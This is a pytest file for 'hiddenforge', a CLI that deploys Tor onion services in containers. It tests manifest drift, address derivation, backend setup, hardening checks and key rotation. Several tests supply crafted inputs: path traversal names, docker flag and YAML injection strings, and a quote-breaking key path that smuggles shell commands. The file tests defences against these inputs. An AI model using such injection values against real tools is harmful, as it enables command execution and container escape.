"""Host unit tests for scripts/hiddenforge (the machine contract) and manifest.json.

These run on the host with no container and no docker: the CLI is stdlib-only and
side-effect free until a subcommand actually writes something. The property under
test is the machine contract itself - stable JSON field names, exit codes, name
validation (names become directories), and Tor v3 address derivation against a
real mkp224o-generated vector.
"""
import subprocess
import json
import os
import shlex
import shutil
import stat
import sys
from pathlib import Path

import pytest

from loader import repo_root

REPO = repo_root(__file__)
CLI_PATH = REPO / "scripts" / "hiddenforge"
VANITY_PATH = REPO / "vanity.py"


def _load(path: Path, name: str):
    """Load a file without the bytecode cache (see tests/loader.py)."""
    from loader import load_file
    return load_file(path, name)


@pytest.fixture(scope="module")
def hf():
    return _load(CLI_PATH, "hf_cli")


@pytest.fixture(scope="module")
def vanity():
    return _load(VANITY_PATH, "hf_vanity")


# A real mkp224o-generated key pair. mkp224o wrote both the 64-byte tagged
# public-key file and the hostname file; deriving the address from the key with
# our own SHA3-256 implementation must reproduce mkp224o's hostname. This is an
# independent cross-check of the derivation, not a self-consistency check.
VECTOR_PUB_HEX = "04c6e8afdf77a1f03511d419b92f1c25de8de2d596973b6ecbeef24c9b0271f2"
VECTOR_ONION = "atdorl67o6q7anir2qm3sly4expi3ywvs2ltw3wl53zezgycohzi2zqd.onion"
PUBLIC_TAG = b"== ed25519v1-public: type0 =="


# ─────────────────────────────────────────────────────────────────────────────
# manifest.json == build_manifest()
# ─────────────────────────────────────────────────────────────────────────────

def test_manifest_file_matches_cli(hf):
    on_disk = json.loads((REPO / "manifest.json").read_text())
    assert on_disk == hf.build_manifest(), (
        "manifest.json drifted from build_manifest(); regenerate it"
    )


def test_manifest_required_contract_fields(hf):
    m = hf.build_manifest()
    for key in ("name", "version", "contract_version", "image", "env", "ports",
                "volumes", "health", "address", "key", "exit_codes", "networks",
                "commands"):
        assert key in m, f"manifest missing {key!r}"
    assert m["name"] == "hiddenforge"
    assert m["address"]["command"].startswith("hiddenforge show")
    assert m["health"]["ready_field"] == "ready"
    assert m["volumes"][0]["contains"] == ["keys", "address"]
    assert m["address"]["file"].endswith("/hostname")
    assert m["key"]["secret"]["mode"] == "0600"


def test_manifest_commands_match_the_registered_parser(hf):
    """The manifest's command list must be the parser's, not a hand-kept copy."""
    manifest = hf.build_manifest()
    assert manifest["commands"], "manifest declares no commands"
    assert manifest["commands"] == hf._registered_commands()
    for cmd in ("setup", "show", "vanity", "verify-image", "sbom"):
        assert cmd in manifest["commands"]


def test_check_manifest_script_detects_drift(hf, monkeypatch):
    """scripts/check_manifest.py must fail when the file and code disagree.

    Acceptance for the CI step that used to only parse the JSON: in sync it
    exits 0, and a stale manifest is reported rather than accepted.
    """
    import importlib.machinery
    import importlib.util
    loader = importlib.machinery.SourceFileLoader(
        "check_manifest", str(REPO / "scripts" / "check_manifest.py"))
    spec = importlib.util.spec_from_loader("check_manifest", loader)
    cm = importlib.util.module_from_spec(spec)
    loader.exec_module(cm)

    assert cm.main() == 0   # the repo is in sync right now

    stale = dict(hf.build_manifest())
    stale["version"] = "0.0.0-not-the-code"

    class _StaleCli:
        def build_manifest(self):
            return stale

    monkeypatch.setattr(cm, "load_cli", _StaleCli)
    assert cm.main() == 1


def test_coverage_summary_emits_number(hf, tmp_path, monkeypatch, capsys):
    """The coverage figure comes from a generated file, not prose."""
    import json as _json
    cs = _load(REPO / "scripts" / "coverage_summary.py", "coverage_summary")
    src = tmp_path / "coverage.json"
    src.write_text(_json.dumps({"totals": {"percent_covered": 57.934}}))
    monkeypatch.chdir(tmp_path)
    assert cs.main([str(src)]) == 0
    assert (tmp_path / "coverage.txt").read_text() == "coverage: 57.93%\n"
    assert "coverage: 57.93%" in capsys.readouterr().out


def test_version_json(hf, capsys):
    rc = hf.main(["version", "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["name"] == "hiddenforge"
    assert doc["contract_version"] == hf.CONTRACT_VERSION
    assert doc["ok"] is True and doc["exit_code"] == 0


def test_info_json_is_manifest(hf, capsys):
    rc = hf.main(["info", "--json"])
    assert rc == 0
    assert json.loads(capsys.readouterr().out) == hf.build_manifest()


# ─────────────────────────────────────────────────────────────────────────────
# Address derivation
# ─────────────────────────────────────────────────────────────────────────────

def test_derive_onion_matches_mkp224o_vector(hf):
    pub = bytes.fromhex(VECTOR_PUB_HEX)
    assert hf.derive_onion(pub) == VECTOR_ONION


def test_derive_onion_rejects_wrong_length(hf):
    with pytest.raises(ValueError):
        hf.derive_onion(b"too short")


def test_read_pubkey_accepts_tagged_and_bare(hf, tmp_path):
    pub = bytes.fromhex(VECTOR_PUB_HEX)
    tagged = tmp_path / "tagged"
    tagged.write_bytes(PUBLIC_TAG + b"\x00" * (32 - len(PUBLIC_TAG) - 3 + 3) + pub)
    # Tag is exactly 32 bytes: 29 visible + 3 NUL.
    tagged.write_bytes(PUBLIC_TAG.ljust(32, b"\x00") + pub)
    bare = tmp_path / "bare"
    bare.write_bytes(pub)
    assert hf.read_pubkey(tagged) == pub
    assert hf.read_pubkey(bare) == pub


def test_read_pubkey_refuses_symlink(hf, tmp_path):
    pub = bytes.fromhex(VECTOR_PUB_HEX)
    real = tmp_path / "real"
    real.write_bytes(pub)
    link = tmp_path / "link"
    link.symlink_to(real)
    with pytest.raises(OSError):
        hf.read_pubkey(link)


# ─────────────────────────────────────────────────────────────────────────────
# Name validation (names become directories)
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("good", ["app", "my-app", "a", "a" * 63, "app1"])
def test_validate_name_accepts(hf, good):
    assert hf.validate_name(good) == good


@pytest.mark.parametrize("bad", [
    "../evil", "a/b", "App", "app_name", "-app", "", "a" * 64, "app\n", "..", ".",
    "app\x00x", "wéb",
])
def test_validate_name_rejects_traversal_and_junk(hf, bad):
    with pytest.raises(ValueError):
        hf.validate_name(bad)


@pytest.mark.parametrize("good", [
    "sambent.dev/sam/hiddenforge:latest",
    "nginx:alpine",
    "alpine:3.23.5@sha256:" + "a" * 64,
    "docker.io/library/nginx:1.27",
])
def test_validate_image_ref_accepts(hf, good):
    assert hf.validate_image_ref(good) == good


@pytest.mark.parametrize("bad", [
    "--privileged",          # would be parsed by `docker run` as a FLAG
    "-v",                    # same
    "--volume=/:/host",      # same
    "img\n    privileged: true",  # YAML injection into compose.service.yml
    "img\n",
    "img:tag extra",
    "",
    " img",
    "img\tx",
    "img;",
])
def test_validate_image_ref_rejects_flag_and_yaml_injection(hf, bad):
    with pytest.raises(ValueError):
        hf.validate_image_ref(bad)


def test_setup_rejects_image_yaml_injection(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80",
                  "--image", "img\n    privileged: true",
                  "-o", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE


# ─────────────────────────────────────────────────────────────────────────────
# address_for / show
# ─────────────────────────────────────────────────────────────────────────────

def _write_service(keys: Path, name: str, pub_hex: str, onion: str | None,
                   dirmode=0o700):
    d = keys / name
    d.mkdir(parents=True)
    os.chmod(d, dirmode)
    pub = bytes.fromhex(pub_hex)
    (d / "hs_ed25519_public_key").write_bytes(PUBLIC_TAG.ljust(32, b"\x00") + pub)
    os.chmod(d / "hs_ed25519_public_key", 0o600)
    (d / "hs_ed25519_secret_key").write_bytes(b"\x00" * 96)
    os.chmod(d / "hs_ed25519_secret_key", 0o600)
    if onion:
        (d / "hostname").write_text(onion + "\n")
    return d


def test_address_for_from_hostname(hf, tmp_path):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    entry = hf.address_for(tmp_path, "app")
    assert entry["onion"] == VECTOR_ONION
    assert entry["source"] == "hostname"
    assert entry["key_path"].endswith("hs_ed25519_secret_key")


def test_address_for_derives_when_hostname_absent(hf, tmp_path):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, None)
    entry = hf.address_for(tmp_path, "app")
    assert entry["onion"] == VECTOR_ONION
    assert entry["source"] == "derived"


def test_address_for_uses_published_file(hf, tmp_path):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, None)
    (tmp_path / "app.onion").write_text(VECTOR_ONION + "\n")
    os.chmod(tmp_path / "app.onion", 0o644)
    entry = hf.address_for(tmp_path, "app")
    assert entry["onion"] == VECTOR_ONION
    assert entry["source"] == "published"


def test_show_json_single_object(hf, tmp_path, capsys):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    rc = hf.main(["show", "--keys", str(tmp_path), "--name", "app", "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    # Contract required exactly these three fields (plus extras).
    assert doc["onion"] == VECTOR_ONION
    assert doc["name"] == "app"
    assert doc["key_path"].endswith("hs_ed25519_secret_key")
    assert doc["ok"] is True


def test_show_missing_address_exits_4(hf, tmp_path, capsys):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, None)
    # Remove the pubkey too, so nothing can be derived.
    (tmp_path / "app" / "hs_ed25519_public_key").unlink()
    rc = hf.main(["show", "--keys", str(tmp_path), "--name", "app", "--json"])
    assert rc == hf.EXIT_NOT_READY
    doc = json.loads(capsys.readouterr().out)
    assert doc["onion"] is None


def test_show_unknown_name_exit_4(hf, tmp_path, capsys):
    rc = hf.main(["show", "--keys", str(tmp_path), "--name", "ghost", "--json"])
    assert rc == hf.EXIT_NOT_READY


# ─────────────────────────────────────────────────────────────────────────────
# setup emitter
# ─────────────────────────────────────────────────────────────────────────────

def test_setup_emits_mergeable_fragment(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--keys", "./tor-keys", "-o", str(tmp_path), "--json"])
    assert rc == 0
    desc = json.loads(capsys.readouterr().out)
    assert desc["ok"] is True
    assert desc["env_var"] == "BLOG_TOR_SERVICE_HOSTS"
    assert desc["env_value"] == "80:web:80"
    frag = (tmp_path / "compose.service.yml").read_text()
    for needle in ("tor-internal", "tor-external", "cap_drop: [ALL]",
                   "no-new-privileges:true", "read_only: true",
                   "BLOG_TOR_SERVICE_HOSTS", "healthcheck",
                   "./tor-keys:/var/lib/tor/hidden_service"):
        assert needle in frag, f"fragment missing {needle!r}"
    assert (tmp_path / "deploy.sh").exists()
    assert (tmp_path / "README.txt").exists()
    assert (tmp_path / "hiddenforge.json").exists()
    # deploy.sh must be executable.
    assert os.stat(tmp_path / "deploy.sh").st_mode & stat.S_IXUSR


def test_setup_multi_service_form(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--services", "blog:80:web:80", "--name", "ignored",
                  "-o", str(tmp_path), "--json"])
    assert rc == 0
    desc = json.loads(capsys.readouterr().out)
    assert desc["name"] == "blog"
    assert desc["env_value"] == "80:web:80"


def test_setup_ip_backend_omits_depends_on(hf, tmp_path, capsys):
    """An IP-literal backend must not emit `depends_on: [<ip>]`.

    That produces `service "tor" depends on undefined service "172.17.0.2"` and
    makes `docker compose config` reject the whole project.
    """
    rc = hf.main(["setup", "--backend", "172.17.0.2:80", "--name", "ipapp",
                  "-o", str(tmp_path), "--json"])
    assert rc == 0
    capsys.readouterr()
    frag = (tmp_path / "compose.service.yml").read_text()
    assert "depends_on" not in frag
    assert "IPAPP_TOR_SERVICE_HOSTS" in frag


def test_setup_service_backend_emits_depends_on(hf, tmp_path, capsys):
    assert hf.main(["setup", "--backend", "web:80", "--name", "blog",
                    "-o", str(tmp_path), "--json"]) == 0
    capsys.readouterr()
    frag = (tmp_path / "compose.service.yml").read_text()
    assert "depends_on" in frag and "- web" in frag


def test_rewrite_key_paths_rewrites_every_field(hf, tmp_path):
    """Regression: address_path/public_key_path used to be left as /keys/...

    The host consumer would then be handed container paths that do not exist on
    its filesystem.
    """
    doc = {
        "key_path": "/keys/app/hs_ed25519_secret_key",
        "key_dir": "/keys/app",
        "address_path": "/keys/app/hostname",
        "public_key_path": "/keys/app/hs_ed25519_public_key",
        "onion": "x.onion",
    }
    out = hf._rewrite_key_paths(doc, tmp_path)
    for field in ("key_path", "key_dir", "address_path", "public_key_path"):
        assert out[field].startswith(str(tmp_path)), field
        assert "/keys/" not in out[field], field
    assert out["onion"] == "x.onion"


def test_setup_requires_backend_non_interactive(hf, tmp_path, capsys, monkeypatch):
    monkeypatch.setattr(sys, "stdin", type("S", (), {"isatty": lambda self: False})())
    rc = hf.main(["setup", "-o", str(tmp_path), "--json", "--non-interactive"])
    assert rc == hf.EXIT_USAGE
    doc = json.loads(capsys.readouterr().out)
    assert doc["ok"] is False


def test_setup_rejects_bad_backend(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web", "-o", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE


def test_setup_multi_service_merges_and_emits(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--service", "blog:80:web:80",
                  "--service", "blog:443:web:443",
                  "--service", "tips:80:tips:8080",
                  "-o", str(tmp_path), "--json"])
    assert rc == 0
    desc = json.loads(capsys.readouterr().out)
    assert [s["name"] for s in desc["services"]] == ["blog", "tips"]
    blog = next(s for s in desc["services"] if s["name"] == "blog")
    assert blog["env_value"] == "80:web:80,443:web:443"
    frag = (tmp_path / "compose.service.yml").read_text()
    # Values must be joined strings, not a Python list repr.
    assert 'BLOG_TOR_SERVICE_HOSTS: "80:web:80,443:web:443"' in frag
    assert 'TIPS_TOR_SERVICE_HOSTS: "80:tips:8080"' in frag
    assert "- tips" in frag and "- web" in frag


def test_setup_refuses_without_force_and_overwrites_with_it(hf, tmp_path, capsys):
    assert hf.main(["setup", "--backend", "web:80", "-o", str(tmp_path),
                    "--json"]) == 0
    capsys.readouterr()
    rc = hf.main(["setup", "--backend", "web:80", "-o", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE
    assert "force" in json.loads(capsys.readouterr().out)["error"]
    assert hf.main(["setup", "--backend", "web:80", "-o", str(tmp_path),
                    "--force", "--json"]) == 0


def test_setup_podman_runtime_omits_apparmor(hf, tmp_path, capsys):
    assert hf.main(["setup", "--backend", "web:80", "--runtime", "podman",
                    "-o", str(tmp_path), "--json"]) == 0
    frag = (tmp_path / "compose.service.yml").read_text()
    assert "apparmor" not in frag
    # Podman rejects the Docker-only tmpfs options; the entrypoint chowns
    # /var/lib/tor itself, so they must not be emitted for podman.
    assert "uid=100" not in frag and "mode=0700" not in frag
    sh = (tmp_path / "deploy.sh").read_text()
    # Compose v2 on the Podman socket first (it applies every limit), then
    # podman-compose as the fallback.
    assert sh.index('export DOCKER_HOST="unix://$SOCK"') < sh.index("COMPOSE=podman-compose")
    assert '"$COMPOSE" -f "$BASE" -f compose.service.yml up -d' in sh


@pytest.mark.parametrize("runtime, has_healthcheck", [("docker", True), ("podman", False)])
def test_only_the_docker_fragment_carries_a_healthcheck(hf, tmp_path, capsys,
                                                        runtime, has_healthcheck):
    """Rootless Podman 4.9 never restarts a container that has a healthcheck when
    no systemd user manager is reachable (measured on Ubuntu 24.04), and the
    restart is how the container follows a moved backend or recovers from a dead
    Tor. `disable: true` is no answer: Docker Compose on the Podman socket sends
    it as test [NONE], which Podman 4.9 still treats as a healthcheck."""
    import yaml
    assert hf.main(["setup", "--backend", "web:80", "--runtime", runtime,
                    "-o", str(tmp_path), "--json"]) == 0
    capsys.readouterr()
    frag = yaml.safe_load((tmp_path / "compose.service.yml").read_text())
    (svc,) = frag["services"].values()
    assert ("healthcheck" in svc) is has_healthcheck
    # Podman restarts only `always` containers after a reboot (measured).
    assert svc["restart"] == ("always" if runtime == "podman" else "unless-stopped")


def test_the_shipped_podman_file_declares_no_healthcheck():
    """Same reason as the fragment. The Docker file keeps its healthcheck: Docker
    restarts a container that has one (measured)."""
    import yaml
    podman = yaml.safe_load((REPO / "podman-compose.yml").read_text())
    docker = yaml.safe_load((REPO / "docker-compose.yml").read_text())
    assert "healthcheck" not in podman["services"]["tor"]
    assert "healthcheck" in docker["services"]["tor"]


def test_podman_services_come_back_after_a_reboot():
    """podman-restart.service starts only restart-policy=always containers.
    Measured with a real reboot on Ubuntu 24.04: unless-stopped stayed Exited,
    always came back ready with the same address."""
    import yaml
    podman = yaml.safe_load((REPO / "podman-compose.yml").read_text())
    docker = yaml.safe_load((REPO / "docker-compose.yml").read_text())
    assert {n: s["restart"] for n, s in podman["services"].items()} == {
        "tor": "always", "web": "always"}
    assert {n: s["restart"] for n, s in docker["services"].items()} == {
        "tor": "unless-stopped", "web": "unless-stopped"}


def test_a_crafted_key_path_is_printed_by_deploy_sh_never_run(hf, tmp_path, capsys):
    """The status hint put the shell-quoted path inside an echo's double quotes;
    a path holding `"` closed them. Measured: --keys 'k"; touch X; echo "' made
    deploy.sh run `touch X`. Found by the fuzz target."""
    marker = tmp_path / "INJECTED"
    marker2 = tmp_path / "INJ2"
    keys = f'k"; touch {marker}; echo "\'$(touch {marker2})'
    out = tmp_path / "out"
    assert hf.main(["setup", "--backend", "web:80", "--keys", keys, "-o", str(out),
                    "--json"]) == 0
    capsys.readouterr()
    script = (out / "deploy.sh").read_text()
    line = next(ln for ln in script.splitlines() if "status --container" in ln)
    proc = subprocess.run(["bash", "-c", line], capture_output=True, text=True, timeout=10)
    assert proc.returncode == 0
    assert not marker.exists() and not marker2.exists()
    # Printed as a command the operator can paste: the path comes back whole.
    assert shlex.split(proc.stdout)[-1] == keys


def test_setup_rejects_bad_name(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80", "--name", "../evil",
                  "-o", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE


# ─────────────────────────────────────────────────────────────────────────────
# doctor --keys-only
# ─────────────────────────────────────────────────────────────────────────────

def test_doctor_keys_only_passes_on_good_modes(hf, tmp_path, capsys):
    os.chmod(tmp_path, 0o700)
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    rc = hf.main(["doctor", "--keys-only", "--keys", str(tmp_path), "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["ok"] is True and doc["failures"] == []


def test_doctor_keys_only_flags_loose_dir(hf, tmp_path, capsys):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION, dirmode=0o755)
    rc = hf.main(["doctor", "--keys-only", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_FAIL
    doc = json.loads(capsys.readouterr().out)
    assert any("0700" in f for f in doc["failures"])


def test_doctor_keys_only_flags_loose_secret(hf, tmp_path, capsys):
    d = _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    os.chmod(d / "hs_ed25519_secret_key", 0o644)
    rc = hf.main(["doctor", "--keys-only", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_FAIL
    doc = json.loads(capsys.readouterr().out)
    assert any("0600" in f for f in doc["failures"])


# ─────────────────────────────────────────────────────────────────────────────
# rotate
# ─────────────────────────────────────────────────────────────────────────────

def test_rotate_requires_confirm(hf, tmp_path, capsys):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    rc = hf.main(["rotate", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE
    assert (tmp_path / "app").is_dir(), "identity must survive a refused rotate"


def test_rotate_archives_identity(hf, tmp_path, capsys):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    rc = hf.main(["rotate", "--keys", str(tmp_path), "--confirm", "ROTATE", "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    archived = Path(doc["archived"])
    assert archived.is_dir() and (archived / "app").is_dir()
    assert tmp_path.is_dir() and not (tmp_path / "app").exists()


def test_rotate_on_a_mount_point_archives_the_contents(hf, tmp_path, capsys,
                                                       monkeypatch):
    """The image's own `rotate` targets its bind mount, and renaming a mount
    point fails with EBUSY -- measured: it could never rotate from inside the
    container. On a mount point the entries move into .rotated-<epoch> instead."""
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    (tmp_path / "app.onion").write_text(VECTOR_ONION + "\n")
    monkeypatch.setattr(hf.os.path, "ismount", lambda p: Path(p) == tmp_path)
    rc = hf.main(["rotate", "--keys", str(tmp_path), "--confirm", "ROTATE", "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == 0, doc
    archived = Path(doc["archived"])
    assert archived.parent == tmp_path and archived.name.startswith(".rotated-")
    assert (archived / "app" / "hostname").exists() and (archived / "app.onion").exists()
    assert sorted(p.name for p in tmp_path.iterdir()) == [archived.name]
    assert sorted(doc["moved"]) == ["app", "app.onion"]


def test_a_second_rotation_does_not_swallow_the_first_archive(hf, tmp_path, capsys,
                                                             monkeypatch):
    monkeypatch.setattr(hf.os.path, "ismount", lambda p: Path(p) == tmp_path)
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    assert hf.main(["rotate", "--keys", str(tmp_path), "--confirm", "ROTATE", "--json"]) == 0
    first = Path(json.loads(capsys.readouterr().out)["archived"])
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    assert hf.main(["rotate", "--keys", str(tmp_path), "--confirm", "ROTATE", "--json"]) == 0
    second = Path(json.loads(capsys.readouterr().out)["archived"])
    assert first != second and first.is_dir() and (first / "app").is_dir()
    assert not (second / first.name).exists()


def test_rotate_refuses_whole_when_a_directory_cannot_be_moved(hf, tmp_path, capsys,
                                                               monkeypatch):
    """Moving a directory to a new parent needs write permission on it; a
    tor-owned service directory seen from the host has none. Checked for every
    entry first, so nothing is left half-rotated."""
    if os.geteuid() == 0:
        pytest.skip("root bypasses directory permissions")
    monkeypatch.setattr(hf.os.path, "ismount", lambda p: Path(p) == tmp_path)
    _write_service(tmp_path, "aaa", VECTOR_PUB_HEX, VECTOR_ONION)
    _write_service(tmp_path, "zzz", VECTOR_PUB_HEX, VECTOR_ONION)
    os.chmod(tmp_path / "zzz", 0o555)  # noqa: S103 - a directory its owner cannot write
    try:
        rc = hf.main(["rotate", "--keys", str(tmp_path), "--confirm", "ROTATE", "--json"])
    finally:
        os.chmod(tmp_path / "zzz", 0o700)
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_FAIL and "nothing was rotated" in doc["error"]
    assert sorted(p.name for p in tmp_path.iterdir()) == ["aaa", "zzz"]


# ─────────────────────────────────────────────────────────────────────────────
# doctor: torrc hardening directives
# ─────────────────────────────────────────────────────────────────────────────

def _fake_inspect():
    return {
        "HostConfig": {
            "CapDrop": ["ALL"],
            "CapAdd": ["CHOWN", "DAC_OVERRIDE", "FOWNER", "SETUID", "SETGID"],
            "SecurityOpt": ["no-new-privileges:true", "apparmor=docker-default"],
            "ReadonlyRootfs": True,
            "PidsLimit": 256,
            "Memory": 536870912,
            "MemorySwap": 536870912,
            "LogConfig": {"Type": "none"},
            "Dns": ["127.0.0.1"],
            "RestartPolicy": {"Name": "unless-stopped"},
        },
        "NetworkSettings": {"Ports": {}},
        "AppArmorProfile": "docker-default",
        "State": {"Running": True},
    }


@pytest.mark.parametrize("value,expected", [
    ("256", 256), (256, 256), ("0", 0), ("", None), ("not-a-number", None), (None, None),
])
def test_as_int_tolerates_engine_junk(hf, value, expected):
    assert hf._as_int(value) == expected


@pytest.mark.parametrize("pids_limit", [None, "", "not-a-number", 0, 256, "512"])
def test_doctor_tolerates_bad_engine_values(hf, tmp_path, capsys, monkeypatch, pids_limit):
    """A junk PidsLimit must produce a verdict, not a traceback."""
    os.chmod(tmp_path, 0o700)
    info = _fake_inspect()
    if pids_limit is None:
        info["HostConfig"].pop("PidsLimit", None)
    else:
        info["HostConfig"]["PidsLimit"] = pids_limit
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (info, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)

    rc = hf.main(["doctor", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc in (0, 1)
    doc = json.loads(capsys.readouterr().out)
    check = next(c for c in doc["checks"] if c["check"].startswith("process count"))
    assert check["ok"] is (pids_limit in (256, "512"))


@pytest.mark.parametrize("dns, ok", [
    (["127.0.0.1"], True), (["::1"], True), (["127.0.0.53", "127.0.0.1"], True),
    ([], False), (None, False), (["1.1.1.1"], False), (["127.0.0.1", "9.9.9.9"], False),
    (["not-an-address"], False),
])
def test_doctor_warns_when_dns_can_leave_the_container(hf, tmp_path, capsys,
                                                       monkeypatch, dns, ok):
    """Measured on Docker and Podman: without a loopback DNS server, a name the
    engine cannot answer -- a backend that is down -- goes to the host's upstream
    DNS every 30 seconds, in step with the onion's outage."""
    os.chmod(tmp_path, 0o700)
    info = _fake_inspect()
    info["HostConfig"]["Dns"] = dns
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (info, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    hf.main(["doctor", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    check = next(c for c in doc["checks"] if c["check"] == "no DNS query leaves the container")
    assert check["ok"] is ok
    assert check["severity"] == "warn"


def _restart_checks(hf, monkeypatch, capsys, tmp_path, policy, engine,
                    linger="Linger=yes", unit="enabled"):
    os.chmod(tmp_path, 0o700)
    info = _fake_inspect()
    info["HostConfig"]["RestartPolicy"] = {"Name": policy} if policy is not None else None
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (info, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    monkeypatch.setattr(hf, "_engine", lambda: engine)
    monkeypatch.setattr(hf, "_is_rootless", lambda: engine == "podman")
    monkeypatch.setenv("USER", "someone")

    def run(cmd, **kw):
        if cmd[0] == "loginctl":
            return subprocess.CompletedProcess(cmd, 0, linger + "\n", "")
        if cmd[:2] == ["systemctl", "--user"]:
            return subprocess.CompletedProcess(cmd, 0, unit + "\n", "")
        return subprocess.CompletedProcess(cmd, 1, "", "")

    monkeypatch.setattr(hf, "_run", run)
    hf.main(["doctor", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    return {c["check"]: c for c in doc["checks"]}, doc


@pytest.mark.parametrize("engine", ["docker", "podman"])
@pytest.mark.parametrize("policy", ["no", "", None])
def test_no_restart_policy_is_a_failure(hf, monkeypatch, capsys, tmp_path, engine, policy):
    """The container heals by exiting and being restarted. Without a policy every
    one of those exits is an outage until someone notices."""
    checks, doc = _restart_checks(hf, monkeypatch, capsys, tmp_path, policy, engine)
    c = checks["the container is restarted when it exits (restart policy)"]
    assert c["ok"] is False and c["severity"] == "fail"
    assert doc["ok"] is False


@pytest.mark.parametrize("policy", ["unless-stopped", "always"])
def test_docker_accepts_both_restarting_policies(hf, monkeypatch, capsys, tmp_path, policy):
    checks, _doc = _restart_checks(hf, monkeypatch, capsys, tmp_path, policy, "docker")
    assert checks["the container is restarted when it exits (restart policy)"]["ok"] is True


@pytest.mark.parametrize("policy, ok", [("always", True), ("unless-stopped", False),
                                        ("on-failure", False)])
def test_podman_needs_always_to_survive_a_reboot(hf, monkeypatch, capsys, tmp_path,
                                                 policy, ok):
    """podman-restart.service starts only restart-policy=always containers.
    Measured with real reboots: unless-stopped stayed Exited."""
    checks, _doc = _restart_checks(hf, monkeypatch, capsys, tmp_path, policy, "podman")
    c = checks["the container comes back after a reboot (Podman restarts only `always`)"]
    assert c["ok"] is ok and c["severity"] == "warn"


@pytest.mark.parametrize("linger, unit, ok_linger, ok_unit", [
    ("Linger=yes", "enabled", True, True),
    ("Linger=no", "disabled", False, False),
])
def test_podman_boot_prerequisites_are_checked(hf, monkeypatch, capsys, tmp_path,
                                               linger, unit, ok_linger, ok_unit):
    checks, _doc = _restart_checks(hf, monkeypatch, capsys, tmp_path, "always", "podman",
                                   linger=linger, unit=unit)
    assert checks["user services run without a login session (linger)"]["ok"] is ok_linger
    unit_check = checks["podman-restart.service is enabled (starts containers at boot)"]
    assert unit_check["ok"] is ok_unit
    if not ok_unit:
        assert "systemctl --user enable podman-restart.service" in unit_check["detail"]


def test_doctor_flags_missing_torrc_directive(hf, tmp_path, capsys, monkeypatch):
    os.chmod(tmp_path, 0o700)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (_fake_inspect(), None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: "ClientOnly 1\n")
    rc = hf.main(["doctor", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_FAIL
    doc = json.loads(capsys.readouterr().out)
    assert any("hardening directive" in f for f in doc["failures"])


def test_doctor_passes_when_torrc_is_complete(hf, tmp_path, capsys, monkeypatch):
    os.chmod(tmp_path, 0o700)
    torrc = "\n".join(hf.HARDENING_DIRECTIVES)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (_fake_inspect(), None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: torrc)
    rc = hf.main(["doctor", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["ok"] is True


# ─────────────────────────────────────────────────────────────────────────────
# exit-code contract
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# setup golden snapshots (lock the emitted contract output)
# ─────────────────────────────────────────────────────────────────────────────

def test_setup_output_matches_golden(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--keys", "./tor-keys", "-o", str(tmp_path), "--json"])
    assert rc == 0
    capsys.readouterr()
    for name in ("compose.service.yml", "deploy.sh", "README.txt"):
        expected = (REPO / "tests" / "golden_setup" / name).read_text()
